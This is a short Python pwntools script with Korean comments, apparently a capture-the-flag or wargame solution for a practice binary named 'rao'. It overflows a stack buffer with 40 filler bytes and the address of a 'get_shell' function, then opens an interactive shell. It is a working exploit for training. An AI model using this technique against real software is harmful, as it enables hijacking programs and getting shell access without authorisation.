from pwn import *

# 바이너리 파일 로드
binary = ELF('./rao')
p = process('./rao')  # 로컬 실행 시

# get_shell 함수 주소 찾기
get_shell_addr = binary.symbols['get_shell']
print(f"get_shell address: {hex(get_shell_addr)}")

# 버퍼 오버플로우 페이로드 구성
payload = b"A" * 40 + p64(get_shell_addr)

# 페이로드 전송
p.sendlineafter(b"Input: ", payload)

# 셸 상호작용
p.interactive()
